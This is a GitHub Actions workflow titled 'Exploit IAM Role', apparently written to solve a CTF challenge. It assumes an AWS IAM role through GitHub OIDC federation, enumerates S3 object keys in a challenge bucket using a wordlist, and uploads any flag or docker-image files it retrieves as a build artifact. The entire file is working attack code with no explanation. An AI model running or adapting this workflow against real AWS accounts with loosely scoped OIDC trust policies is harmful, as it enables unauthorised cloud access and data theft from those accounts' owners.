name: Exploit IAM Role
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1
          role-session-name: ctf-session
      - name: Debug Role
        run: |
          aws sts get-caller-identity
          aws s3api get-object --bucket challenge-assets-production-empasoft-ctf --key forensic/imaginary-challenge/docker-image.tar /tmp/test.tar || echo "GetObject failed for docker-image.tar"
      - name: Try S3 Files
        run: |
          echo "Trying default paths..."
          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/docker-image.tar /tmp/image.tar 2>/dev/null && echo "Downloaded: docker-image.tar" && exit 0
          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/flag.txt /tmp/flag.txt 2>/dev/null && echo "Downloaded: flag.txt" && exit 0
          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/encrypted_flag.txt /tmp/encrypted_flag.txt 2>/dev/null && echo "Downloaded: encrypted_flag.txt" && exit 0
          echo "Trying wordlist paths..."
          for word in $(cat wordlist.txt); do
            aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/docker-image-$word.tar /tmp/image-$word.tar 2>/dev/null && echo "Downloaded: docker-image-$word.tar" && exit 0
            aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/$word.tar /tmp/image-$word.tar 2>/dev/null && echo "Downloaded: $word.tar" && exit 0
            aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/$word.txt /tmp/$word.txt 2>/dev/null && echo "Downloaded: $word.txt" && exit 0
          done
          echo "No valid file found."
      - name: Save and Upload Artifact
        run: |
          mkdir -p /tmp/artifacts
          mv /tmp/image*.tar /tmp/*.txt /tmp/artifacts/ 2>/dev/null || echo "No files to move."
          ls -l /tmp/artifacts/
      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: ctf-files
          path: /tmp/artifacts/
          if-no-files-found: warn
